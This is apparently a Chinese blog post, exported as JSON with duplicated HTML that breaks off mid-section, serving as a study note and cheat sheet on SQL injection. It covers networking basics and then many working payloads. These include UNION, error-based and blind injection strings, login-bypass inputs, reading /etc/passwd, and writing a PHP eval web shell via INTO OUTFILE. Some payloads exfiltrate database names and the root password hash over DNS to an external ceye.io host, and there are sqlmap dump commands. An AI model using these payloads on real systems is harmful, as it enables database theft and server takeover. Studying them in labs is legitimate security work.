（1）某个应用进程首先调用close，称该端执行“主动关闭”（active close）。该端的TCP于是发送一个FIN分节，表示数据发送完毕。\n- (2) 接收到这个FIN的对端执行 “被动关闭”（passive close），这个FIN由TCP确认。\n- (3) 一段时间后，接收到这个文件结束符的应用进程将调用close关闭它的套接字。这导致它的TCP也发送一个FIN。\n- (4) 接收这个最终FIN的原发送端TCP（即执行主动关闭的那一端）确认这个FIN。 \n\n### 4. HTTP状态码\n\n- 2XX  成功\n- 3XX  跳转\n- 4XX  错误\n- 5XX   服务器错误\n\n### 5.  常用端口\n\n- 21   FTP\n- 22  SSH\n- 23  Telent\n- 25   SMTP\n- 53   DNS\n- 80   HTTP\n- 135 \n- 139 \n- 443  HTTPS\n- 445  SMB\n- 1433  SQLSERVER\n- 1521   ORCAL\n- 3306  MYSQL\n- 3389   rdp\n- 4899    远程桌面\n- 5900-59XX   VNC\n- 8080  管理端口\n\n### 6. 数据库基础\n\n#### 主流数据库\n\n- SQL SERVER\n- MYSQL\n- oraccle\n- PostgreSQL\n- 可以使用  Navicat premium  连接数据库\n\n#### 数据库查询版本\n\n- Mssql   select  @@version\n- Mysql    select  vresion（）/select @@version\n- oracle    select banner from ￥version\n- Postgresql  select version（）\n\n#### SQL语法基础\n\n- 库操作\n\n  - 连接数据库   mysql  -u  用户名 -p\n  - 创建数据库：create database  数据库名称、\n  - 删除数据库    drop  database 数据库名称、\n  - 列出数据库  show databases\n  - 使用数据据库  use 数据库名称、\n  - 查看当前数据库   select database（）\n\n- 表操作\n\n  - 新建表create table  表名（键 varchar（10），键int（10））\n  - 列出表  show tables\n  - 删除表  delete  表名\n\n- 数据操作\n\n  - 增加数据insert into  表名（键，键）values（值，值）\n\n  - 删除数据 delete from 表名 where  键=值（删除某一行数据）\n\n  - 修改数据 updata 表名 set 键 = 值 where 键=值\n\n  - 查询数据  select * fom 表名\n\n    存放数据库 information_ schema（存放schemata、  table、columns等等）     \n\n    存放数据库名  schemata\n\n    表  table\n\n    字段  columns\n\n### 7.  注入漏洞\n\n#### 注入概述\n\n- 什么是注入漏洞、\n  - 注入攻击的本质，Web应用程序没有过滤用户输入*，直接把用户输入的恶意数据当做代码执行\n  - 两个条件\n    - 用户能够控制输入\n    - 原本程序要执行的代码，拼接了用户输入的数据\n\n#### 注入类型\n\n- SQL注入：攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗数据库服务器执行恶意的SQL命令命令注入：后端未过滤掉恶意数据，代码当做系统命令执行。\n- 代码注入：一般出现在不安全的使用某些函数\n  - 文件包含\n  - 反序列化漏洞\n- LDAP注入\n  - LDAP（轻量级目录访问协议），用于访问网络中的目录服务，常用在Active Directory，企业管理目录。\n    用户提交的输入不经验证插入LDAP搜索过滤器中，攻击者通过提交专门设计的输入修改过滤器的结构，以检索数据或执行未授权操作\n- XML注入\n  - XXE漏洞：引用外部实体时，通过构造恶意内容，导致读取任意文件、\n    执行系统命令、探测内网端口、攻击内网网站等危害。\n  - XPath注入：与SQL注入类似，XPath解析器本身对URL、表单中提交的代码内容未作严格限制，导致恶意代码可以直接解析执行\n  - XQuery注入\n- JSON注入：轻量级的数据交换格式，主要利用特殊字符注入JSON中，造成解析失败\n- JSONP注入：回调函数未作严格的检测和过滤\n- 判断一个HTTP请求是否存在SQL注入的方式：\n  - 经典：and1=1|and2>1|or1=1 |or1<1\n  - 数据库函数：and sleep（4】=1 I and length（user（）】>3\n  - 特殊符号：单引号（’）双引号（”）\n\n#### 注入点\n\n- GET\n- POST\n- Cookie\n- Host\n- User-Agent\n\n#### 自动化注入工具\n\n- （1）SQL注入工具：\n  - Sqlmap Havij Sqlid\n- （2）ASP，JSP注入工具：\n  - NBSI阿D注入软件明小子注入软件\n- （3）PHP注入工具：\n  - 穿山甲注入软件海阳顶端注入软件\n\n### 8. SQL手工注入步骤\n\n#### 注入点寻找\n\n- 判断请求方式\n\n  - 浏览器F12  点网络\n\n- 单引号闭合’  ‘\n\n- 数字\n\n- 单引号括号闭合（’ ‘）\n\n- 双引号括号闭合（“ ”）\n\n- or 1=1\n\n- or 1=2\n\n- and 1=1\n\n- and 1=2\n\n- #### 数字型注入\n\n  - 加单引号  错误出异常\n  - and 1=1   正常\n  - and   1=2  异常\n\n- #### 字符型注入\n\n  - 加单引号  错误出异常\n  - and '1' = '1  正常\n  - and '1' = '2  异常\n\n#### 判断字段长度\n\n- order  by  数字   可以判断字段的个数\n- 也可以用猜字段  union  select 1，2，3\n\n#### 判断字段回显位置\n\n在链接后面添加语句`【 union select 1,2,3,4,5,6,7,8,9,10,11#】`进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。 \n\n#### 判断数据库注入\n\n利用内置函数暴数据库信息 \nversion()版本；database()数据库；user()用户； \n不用猜解可用字段暴数据库信息(有些网站不适用): \nand 1=2 union all select version() \nand 1=2 union all select database() \nand 1=2 union all select user() \n操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user \n数据库权限： \nand ord(mid(user(),1,1))=114 返回正常说明为root \n\n#### 查找数据库名\n\n- GET：IP/Less-1/?id=100' union select 1,(select database()),3--+\n\n- POST：union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+\n\n- 查看数据库长度length（） and length(database())>10--+\n\n- 查看数据库名字mid（）或者left    \n\n  - mid (string，start，length）返回指定的字符串从指定位置开始（可以用来猜数据库名 ） and mid(database(),1,1)>'a'\n\n  - left (string,lenth)  返回最左边指定的字符数\n\n    and left(database(),1)>'a'  (猜名字)\n\n- 将查到的库名放到同一个字符串\n\n  - select GROUP_CONCAT(schema_name) from information_schema.schemata\n\n- 查到数单个据库名发送到ceye\n\n  - union select 1,(select load_file(concat('\\\\\\\\',substr((select schema_name from information_schema.schemata  limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc')))--+\n\n#### 查找数据表\n\n- union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security') ,3 \n\n- 将单个表名发送到ceye\n\n  uname=1') union select 3,(select load_file(concat('\\\\\\\\',substr((select table_name from information_schema.tables where table_schema ='security'  limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc')))--+\n\n#### 查找数据表中所有字段（列）\n\n- #### 127.0.0.1/Less-3/?id=100') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security') --+\n\n- 获取内容\n\n  - union select 1,(select group_concat(username) from security.users limit 0,1),3 \n\n- 查询某一个表的字段名发送到ceye\n\n  - union select 1,(select load_file(concat('\\\\\\\\',substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc')))--+\n\n#### 猜解账号密码\n\n- outfile文件注入\n\n  - union select 1,'<?php @eval($_POST[360]);?>' into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-8\\\\3.php'--+\n  - into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-13\\\\1.txt'\n\n- 查root密码ceye代码\n\n  127.0.0.1/Less-1/?id=1' union SELECT 1,(LOAD_FILE(CONCAT('\\\\\\\\',mid((SELECT password FROM mysql.user WHERE user='root' LIMIT 1),2,41),'.mysql.ip.port.38ljf2.ceye.io\\\\abc'))),3--+\n\n- bug   \n\n  uname=1') or 1=1 into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-13\\\\1.txt';--+\n\n  这个文件里会有所有的用户名和密码\n\n- 查询数据\n\n  union select 1,(select 1 from (select count(*),concat((select(select(select distinct concat(username,password) from users limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+\n\n#### 绕过登陆验证\n\n- admin' --\n- admin' #\n- admin'/*\n- ' or 1=1--\n- ' or 1=1#\n- ' or 1=1/*\n- ') or '1'='1--\n- ') or ('1'='1--\n\n#### SQL注入常见函数\n\n- group_concat函数   可以把查询的内容组合成一个字符串\n\n- load_file(file name )  读取文件并将文件按字符串返回\n\n- left（string，length）返回最左边指定的字符数：\n  left（database（），1）>'s'  (猜名字)\n\n- length（）判断长度\n  length（database（）>5 \n\n- substr（a，b，c）从字符串a中截取 b到c长度\n\n- ascii（）将某个字符转为ascii值\n\n  ascii（substr（user（），1，1））=101#\n\n- mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）\n\n### 9. SQL注入备忘\n\n#### SQL注入常用命令\n\n- 查看当前用户：union select 1,(select user())--+\n\n- 查看数据库版本：union select 1,(select version())--+\n\n- 查看当前数据库名：union select 1,(select database())--+\n\n- 查看操作系统union select 1,(select @@version_compile_os)--+\n\n- 所有用户：\n\n  - union select 1,(select group_concat(user) from mysql.user)--\n\n    +\n\n- 用户hash\n\n  - union select 1,(select group_concat(password) from mysql.user where user='root')\n\n- 查看所有数据库名\n\n  - union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)--+\n\n- 查看某一个库的全部表\n\n  - union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema='库名')--+\n  - union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema='库名'\n\n- 查看某个表的字段名\n\n  - union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name='表名')--+\n\n- 查看某个库中某个表的字段名\n\n  - union select 1,(select group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='库名')--+\n\n- 读文件\n\n  - union select 1,(SELECT load_file('/etc/passwd'))--+\n\n- 写文件\n\n  - union select 1,'<?php @eval($_POST[360]);?>' into outfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\Less-8\\\\3.php'--+\n\n#### UNION注入\n\n- 猜字段长度\n  - order by 数字     uname=1' order by 2\n- 暴字段位置\n  - union select 1,2      uname=1' union select 1,2\n- 在指定表中查询制指定用户的密码\n  - union SELECT 1,password from 表 where username='用户名'--+\n\n#### 报错注入\n\n- floor   （SELECT user()可修改）\n\n  - OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--+\n\n- ### ExtractValue(有长度限制,最长32位)   （select @@version可修改）\n\n  - and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+\n\n- ### UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）\n\n  - and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+\n\n- ### NAME_CONST(适用于低版本，不太好用)\n\n  - and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--+\n\n- ### Error based Double Query Injection\n\n  - or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1--+\n\n- ### exp(5.5.5以上) （select user()可修改）\n\n  - and (select exp(~(select * from(select user())x)))--+\n\n- floor(Mysql):  and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n- Extractvalue(Mysql):  and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n- Updatexml(Mysql):  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n\n- EXP: and exp(~(select * from(select user())a));\n\n- UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(select bannerO from sys.v_$version where rownum=1))\n\n- multipoint(Mysql)：and multipoint((select * from(select * from(select user())a)b));\n\n- polygon(Mysql)：and polygon((select * from(select * from(select user())a)b));\n\n- multipolygon(Mysql)：and multipolygon((select * from(select * from(select user())a)b));\n\n- linestring(Mysql)：and linestring((select * from(select * from(select user())a)b));\n\n- multilinestring(Mysql)：and multilinestring((select * from(select * from(select user())a)b));\n\n#### bool盲注\n\n- 盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。\n\n- ##### 布尔条件构造\n\n  - ```sql\n    //正常情况\n    'or bool#\n    true'and bool#\n        \n    //不使用空格、注释\n    'or(bool)='1\n    true'and(bool)='1\n        \n    //不使用or、and、注释\n    '^!(bool)='1\n    '=(bool)='\n    '||(bool)='1\n    true'%26%26(bool)='1\n    '=if((bool),1,0)='0\n        \n    //不使用等号、空格、注释\n    'or(bool)<>'0\n    'or((bool)in(1))or'0\n        \n    //其他\n    or (case when (bool) then 1 else 0 end)\n    ```\n\n  - 有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz\n\n  - ```sql\n    1' or (bool) or '1'='1\n    1%' and (bool) or 1=1 and '1'='1\n    ```\n\n- ##### 构造逻辑判断\n\n  - 逻辑判断基本就那些函数：\n\n  - ```sql\n    left(user(),1)>'r'  \n    right(user(),1)>'r'  \n    substr(user(),1,1)='r'  \n    mid(user(),1,1)='r' \n        \n    //不使用逗号 \n    user() regexp '^[a-z]'\n    user() like 'root%'\n    POSITION('root' in user())\n    mid(user() from 1 for 1)='r'\n    mid(user() from 1)='r'\n    ```\n\n- ##### 利用order by盲注\n\n  ```sql\n  mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;\n  +----+----------+---------------------------\n  | id | username | password                   \n  +----+----------+---------------------------\n  |  1 | 2        | 5                         \n  |  1 | admin    | 51b7a76d51e70b419f60d34 |\n  +----+----------+---------------------------\n  2 rows in set (0.00 sec)\n      \n  mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;\n  +-----+--------+---------------------------\n  |id   |username| password                  \n  +----+--------+---------------------------\n  |  1  | admin- |51b7a76d51e70b419f60d3\n  |  1  |    2   | 6                            +------+----------+-------------------------\n  2 rows in set (0.01 sec)\n  ```\n\n#### 延时盲注\n\n- 相对于bool盲注，就是把返回值0和1改为是否执行延时，**能用其他方法就不使用延时**。 \n- 一般格式`if((bool),sleep(3),0)`和`or (case when (bool) then sleep(3) else 0 end)`\n- 两个函数： \n- BENCHMARK(100000,MD5(1)) \n- sleep(5)\n- BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()\n\n#### Mysql注释符\n\n```sql\n1. -- -\n2. /* .... */\n3. #\n4. `\n5. ;%00 \n```\n\n#### GBK绕过注入\n\n- 在分号前加%df%27\n- 示例：id=1%d%27 union select 1.2--+\n\n10. 自动化注入工具\n\n#### SQL注入工具\n\n- sqlmap使用\n  - 测试注入点  sqlmap  -u  \"URL\"\n  - 爆数据库  sqlmap  -u  \"URL\"  --dbs\n  - 查看当前库  sqlmap  -u  \"URL\"  --current -db\n  - 显示数据表  sqlmap  -u  \"URL\"  -D 数据库 --tables\n  - 显示字段      sqlmap  -u  \"URL\"  -D 数据库 -T 表  --columns\n  - 脱库  sqlmap  -u  \"URL\"  -D 数据库 -T 表  -C \"字段名1\",\"字段名2\"  --dump\n  - 查看帮助   man  sqlmap\n  - 查看注入点   sqlmap -r  1.txt \n  - 爆数据库   sqlmap -r  1.txt  --dbs    （注意在注入点后面加*）\n  - 查看当前库  sqlmap  -r  1.txt  --current -db\n  - 显示数据表   sqlmap   -r  1.txt   -D 数据库 --tables\n  - 显示字段      sqlmap  -r  1.txt  -D 数据库 -T 表  --columns\n  - 查看某字段数据  sqlmap  -r  1.txt  -D 数据库 -T 表  -C  “字段名，字段名”  --dump\n- havij\n- sqlid\n\n#### ASP、JSP注入工具\n\n- NBSI\n- 阿D注入软件\n- 明小子\n\n#### PHP注入工具\n\n- 穿山甲注入软件\n- 海阳顶端注入软件\n\n#### 安全专家用的注入工具\n\n- BSQL Hacker（注入框架）\n- The Mole（可攻击Mysql、SQL server、Postgres和oracle）\n- Pangolin （白帽专用啊哈哈哈哈）\n- sqlamp  （非常强大）\n- Havij （可攻击Mysql、oracle、Postgres、MS Access）\n- safe3 SQL Injector（简单易用）\n- SQL Poizon\n\n### 10. 笔记\n\n- 爆SQL\n  select schema_name from information_schema.schemata\n  猜数据库\n  select schema_name from information_schema.schemata limit 0,1 （limit第几行）\n  test\n- select table_name from information_schema.tables where table_schema='xxxxx'\n  猜某库的数据表\n- select column_name from information_schema.columns where table_name='xxxxx'\n  猜某表的所有列\n- select *** from ***\n- \n- mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位\n  ord 同ASCII\n  substr（user(),2,1）\n  substr（database(),2,1）从databases数据库名的第2位，截取长度为1\n  Order by 对前面的数据进行排序\n  information_schema 系统数据库名\n  tables 表名\n  information_schema.tables 查询这个数据库表\n  table_schema 这个字段\n  select table_name from information_schema.tables where table_schema = \"security\";\n  select 列名称from表名 where列 运算符 值\n  @$sql=\"SELECT username, password FROM users WHERE username='admin'or'1'='1# and\n  password='$passwd' LIMIT 0,1\";\n  数据库运行的SQL语句代码如上:\n  输入“ ‘后，注意 提示语法错误的 注明 ’ ” ）\n  ') or '1'=('1' \n  ) or 1=1 -\n  ') or 1=1 order by 2  查看几列\n- 显示登录信息可以使用联合查询得到数据库名等信息\n  uname=1admin'union select 1,database()-- -&passwd=&submit=Submit\n  联合查询  得到  database(数据库名)\n- 不显示登录信息使用 布尔型盲注\n  uname=admin')and left(database(),1)>'a'#&passwd=1&submit=Submit\n  database(),1表示第一位 >大于a        大于的话就返回true\n  left(database(),1) ='s'    截取数据库名的前1位 \n  left(database(),2) ='se'  截取数据库名的前2位 \n  length(database())=8  查看数据库的长度\n  left(version()1)=5    查看数据库第1位为5\n  通过二分法 查到某位没有>,= a（或者数字）\n  注释掉最后字符 -- - --+ # %23 （每个试）\n- substr(database(),,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换\n  为 ascii 值\n- admin'and If(ascii(substr(database(),2,1))=115,1,sleep(5))#\n  时间注入 正确的话 直接登录，否则延迟5秒，得出 数据库名为 security\n  'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))-- -\n  猜测第一个数据表的第一位是 e...依次类推，得到 emai\n  limit 0,1 从0的位置开始 第1行 是emai  limit 1,1 从1的位置开始 第1行 是 ？？\n  猜测 users 表的列\n  http://127.0.0.1/sqllib/Less-9/?id=1'and If(ascii(substr((select column_name from information\n  _schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+\n  猜测 username 的值\n  http://127.0.0.1/sqllib/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))-- -\n  猜第2位\n  'and If(ascii(substr((select username from users limit 0,1), 2,1))=117,1,sleep(5))-- -\n  是Dump\n  SELECT CONCAT(id, '，', name) AS con FROM info LIMIT 1\n  concat 某几列\n  limit1    行1\n  以上为  查询第一行的  id 列 和name列，中间用,号隔开\n- 报 错 注 入\n  1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+\n- uname=admin\"and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&passwd=1&sub\n  If(ascii(substr(database(),1,1))>115,0,sleep(5))%23\n- select table_name from information_schema.tables where table_schema='security' limit 0,1\n  table_name   \n  MYSQL 里面所有的表\n  information_schema.tables\n- 系统函数\n  介绍几个常用函数：\n- 1. version()——MySQL 版本\n  2. user()——数据库用户名\n  3. database()——数据库名\n  4. @@datadir——数据库路径\n  5. @@version_compile_os——操作系统版本","slug":"SQL注入漏洞","published":1,"updated":"2019-06-19T17:23:13.382Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istnr00ak4dsbsdvgtn8t","content":"<h3 id=\"1-OSI七层模型\"><a href=\"#1-OSI七层模型\" class=\"headerlink\" title=\"1. OSI七层模型\"></a>1. OSI七层模型</h3><ul>\n<li>物理层 、数据链路层、网络层、传输层、会话层、表示层、应用层</li>\n</ul>\n<h3 id=\"2-TCP三次握手\"><a href=\"#2-TCP三次握手\" class=\"headerlink\" title=\"2. TCP三次握手\"></a>2. TCP三次握手</h3><ul>\n<li>（1）客户端发送SYN（SEQ=x）报文给服务器端，进入SYN_SEND状态。</li>\n<li>（2）服务器端收到SYN报文，回应一个SYN （SEQ=y）ACK(ACK=x+1）报文，进入<a href=\"https://baike.baidu.com/item/SYN_RECV\" target=\"_blank\" rel=\"noopener\">SYN_RECV</a>状态。</li>\n<li>（3）客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1）报文，进入Established状态。</li>\n</ul>\n<h3 id=\"3-TCP四次分手\"><a href=\"#3-TCP四次分手\" class=\"headerlink\" title=\"3. TCP四次分手\"></a>3. TCP四次分手</h3><ul>\n<li>（1）某个应用进程首先调用close，称该端执行“主动关闭”（active close）。该端的TCP于是发送一个FIN分节，表示数据发送完毕。</li>\n<li>(2) 接收到这个FIN的对端执行 “被动关闭”（passive close），这个FIN由TCP确认。</li>\n<li>(3) 一段时间后，接收到这个文件结束符的应用进程将调用close关闭它的套接字。这导致它的TCP也发送一个FIN。</li>\n<li>(4) 接收这个最终FIN的原发送端TCP（即执行主动关闭的那一端）确认这个FIN。 </li>\n</ul>\n<h3 id=\"4-HTTP状态码\"><a href=\"#4-HTTP状态码\" class=\"headerlink\" title=\"4. HTTP状态码\"></a>4. HTTP状态码</h3><ul>\n<li>2XX  成功</li>\n<li>3XX  跳转</li>\n<li>4XX  错误</li>\n<li>5XX   服务器错误</li>\n</ul>\n<h3 id=\"5-常用端口\"><a href=\"#5-常用端口\" class=\"headerlink\" title=\"5.  常用端口\"></a>5.  常用端口</h3><ul>\n<li>21   FTP</li>\n<li>22  SSH</li>\n<li>23  Telent</li>\n<li>25   SMTP</li>\n<li>53   DNS</li>\n<li>80   HTTP</li>\n<li>135 </li>\n<li>139 </li>\n<li>443  HTTPS</li>\n<li>445  SMB</li>\n<li>1433  SQLSERVER</li>\n<li>1521   ORCAL</li>\n<li>3306  MYSQL</li>\n<li>3389   rdp</li>\n<li>4899    远程桌面</li>\n<li>5900-59XX   VNC</li>\n<li>8080  管理端口</li>\n</ul>\n<h3 id=\"6-数据库基础\"><a href=\"#6-数据库基础\" class=\"headerlink\" title=\"6. 数据库基础\"></a>6. 数据库基础</h3><h4 id=\"主流数据库\"><a href=\"#主流数据库\" class=\"headerlink\" title=\"主流数据库\"></a>主流数据库</h4><ul>\n<li>SQL SERVER</li>\n<li>MYSQL</li>\n<li>oraccle</li>\n<li>PostgreSQL</li>\n<li>可以使用  Navicat premium  连接数据库</li>\n</ul>\n<h4 id=\"数据库查询版本\"><a href=\"#数据库查询版本\" class=\"headerlink\" title=\"数据库查询版本\"></a>数据库查询版本</h4><ul>\n<li>Mssql   select  @@version</li>\n<li>Mysql    select  vresion（）/select @@version</li>\n<li>oracle    select banner from ￥version</li>\n<li>Postgresql  select version（）</li>\n</ul>\n<h4 id=\"SQL语法基础\"><a href=\"#SQL语法基础\" class=\"headerlink\" title=\"SQL语法基础\"></a>SQL语法基础</h4><ul>\n<li><p>库操作</p>\n<ul>\n<li>连接数据库   mysql  -u  用户名 -p</li>\n<li>创建数据库：create database  数据库名称、</li>\n<li>删除数据库    drop  database 数据库名称、</li>\n<li>列出数据库  show databases</li>\n<li>使用数据据库  use 数据库名称、</li>\n<li>查看当前数据库   select database（）</li>\n</ul>\n</li>\n<li><p>表操作</p>\n<ul>\n<li>新建表create table  表名（键 varchar（10），键int（10））</li>\n<li>列出表  show tables</li>\n<li>删除表  delete  表名</li>\n</ul>\n</li>\n<li><p>数据操作</p>\n<ul>\n<li><p>增加数据insert into  表名（键，键）values（值，值）</p>\n</li>\n<li><p>删除数据 delete from 表名 where  键=值（删除某一行数据）</p>\n</li>\n<li><p>修改数据 updata 表名 set 键 = 值 where 键=值</p>\n</li>\n<li><p>查询数据  select * fom 表名</p>\n<p>存放数据库 information_ schema（存放schemata、  table、columns等等）     </p>\n<p>存放数据库名  schemata</p>\n<p>表  table</p>\n<p>字段  columns</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"7-注入漏洞\"><a href=\"#7-注入漏洞\" class=\"headerlink\" title=\"7.  注入漏洞\"></a>7.  注入漏洞</h3><h4 id=\"注入概述\"><a href=\"#注入概述\" class=\"headerlink\" title=\"注入概述\"></a>注入概述</h4><ul>\n<li>什么是注入漏洞、<ul>\n<li>注入攻击的本质，Web应用程序没有过滤用户输入*，直接把用户输入的恶意数据当做代码执行</li>\n<li>两个条件<ul>\n<li>用户能够控制输入</li>\n<li>原本程序要执行的代码，拼接了用户输入的数据</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"注入类型\"><a href=\"#注入类型\" class=\"headerlink\" title=\"注入类型\"></a>注入类型</h4><ul>\n<li>SQL注入：攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗数据库服务器执行恶意的SQL命令命令注入：后端未过滤掉恶意数据，代码当做系统命令执行。</li>\n<li>代码注入：一般出现在不安全的使用某些函数<ul>\n<li>文件包含</li>\n<li>反序列化漏洞</li>\n</ul>\n</li>\n<li>LDAP注入<ul>\n<li>LDAP（轻量级目录访问协议），用于访问网络中的目录服务，常用在Active Directory，企业管理目录。<br>用户提交的输入不经验证插入LDAP搜索过滤器中，攻击者通过提交专门设计的输入修改过滤器的结构，以检索数据或执行未授权操作</li>\n</ul>\n</li>\n<li>XML注入<ul>\n<li>XXE漏洞：引用外部实体时，通过构造恶意内容，导致读取任意文件、<br>执行系统命令、探测内网端口、攻击内网网站等危害。</li>\n<li>XPath注入：与SQL注入类似，XPath解析器本身对URL、表单中提交的代码内容未作严格限制，导致恶意代码可以直接解析执行</li>\n<li>XQuery注入</li>\n</ul>\n</li>\n<li>JSON注入：轻量级的数据交换格式，主要利用特殊字符注入JSON中，造成解析失败</li>\n<li>JSONP注入：回调函数未作严格的检测和过滤</li>\n<li>判断一个HTTP请求是否存在SQL注入的方式：<ul>\n<li>经典：and1=1|and2&gt;1|or1=1 |or1&lt;1</li>\n<li>数据库函数：and sleep（4】=1 I and length（user（）】&gt;3</li>\n<li>特殊符号：单引号（’）双引号（”）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"注入点\"><a href=\"#注入点\" class=\"headerlink\" title=\"注入点\"></a>注入点</h4><ul>\n<li>GET</li>\n<li>POST</li>\n<li>Cookie</li>\n<li>Host</li>\n<li>User-Agent</li>\n</ul>\n<h4 id=\"自动化注入工具\"><a href=\"#自动化注入工具\" class=\"headerlink\" title=\"自动化注入工具\"></a>自动化注入工具</h4><ul>\n<li>（1）SQL注入工具：<ul>\n<li>Sqlmap Havij Sqlid</li>\n</ul>\n</li>\n<li>（2）ASP，JSP注入工具：<ul>\n<li>NBSI阿D注入软件明小子注入软件</li>\n</ul>\n</li>\n<li>（3）PHP注入工具：<ul>\n<li>穿山甲注入软件海阳顶端注入软件</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"8-SQL手工注入步骤\"><a href=\"#8-SQL手工注入步骤\" class=\"headerlink\" title=\"8. SQL手工注入步骤\"></a>8. SQL手工注入步骤</h3><h4 id=\"注入点寻找\"><a href=\"#注入点寻找\" class=\"headerlink\" title=\"注入点寻找\"></a>注入点寻找</h4><ul>\n<li><p>判断请求方式</p>\n<ul>\n<li>浏览器F12  点网络</li>\n</ul>\n</li>\n<li><p>单引号闭合’  ‘</p>\n</li>\n<li><p>数字</p>\n</li>\n<li><p>单引号括号闭合（’ ‘）</p>\n</li>\n<li><p>双引号括号闭合（“ ”）</p>\n</li>\n<li><p>or 1=1</p>\n</li>\n<li><p>or 1=2</p>\n</li>\n<li><p>and 1=1</p>\n</li>\n<li><p>and 1=2</p>\n</li>\n<li><h4 id=\"数字型注入\"><a href=\"#数字型注入\" class=\"headerlink\" title=\"数字型注入\"></a>数字型注入</h4><ul>\n<li>加单引号  错误出异常</li>\n<li>and 1=1   正常</li>\n<li>and   1=2  异常</li>\n</ul>\n</li>\n<li><h4 id=\"字符型注入\"><a href=\"#字符型注入\" class=\"headerlink\" title=\"字符型注入\"></a>字符型注入</h4><ul>\n<li>加单引号  错误出异常</li>\n<li>and ‘1’ = ‘1  正常</li>\n<li>and ‘1’ = ‘2  异常</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"判断字段长度\"><a href=\"#判断字段长度\" class=\"headerlink\" title=\"判断字段长度\"></a>判断字段长度</h4><ul>\n<li>order  by  数字   可以判断字段的个数</li>\n<li>也可以用猜字段  union  select 1，2，3</li>\n</ul>\n<h4 id=\"判断字段回显位置\"><a href=\"#判断字段回显位置\" class=\"headerlink\" title=\"判断字段回显位置\"></a>判断字段回显位置</h4><p>在链接后面添加语句<code>【 union select 1,2,3,4,5,6,7,8,9,10,11#】</code>进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。 </p>\n<h4 id=\"判断数据库注入\"><a href=\"#判断数据库注入\" class=\"headerlink\" title=\"判断数据库注入\"></a>判断数据库注入</h4><p>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):<br>and 1=2 union all select version()<br>and 1=2 union all select database()<br>and 1=2 union all select user()<br>操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user<br>数据库权限：<br>and ord(mid(user(),1,1))=114 返回正常说明为root </p>\n<h4 id=\"查找数据库名\"><a href=\"#查找数据库名\" class=\"headerlink\" title=\"查找数据库名\"></a>查找数据库名</h4><ul>\n<li><p>GET：IP/Less-1/?id=100’ union select 1,(select database()),3–+</p>\n</li>\n<li><p>POST：union select 1,(select group_concat(schema_name) from information_schema.schemata),3–+</p>\n</li>\n<li><p>查看数据库长度length（） and length(database())&gt;10–+</p>\n</li>\n<li><p>查看数据库名字mid（）或者left    </p>\n<ul>\n<li><p>mid (string，start，length）返回指定的字符串从指定位置开始（可以用来猜数据库名 ） and mid(database(),1,1)&gt;’a’</p>\n</li>\n<li><p>left (string,lenth)  返回最左边指定的字符数</p>\n<p>and left(database(),1)&gt;’a’  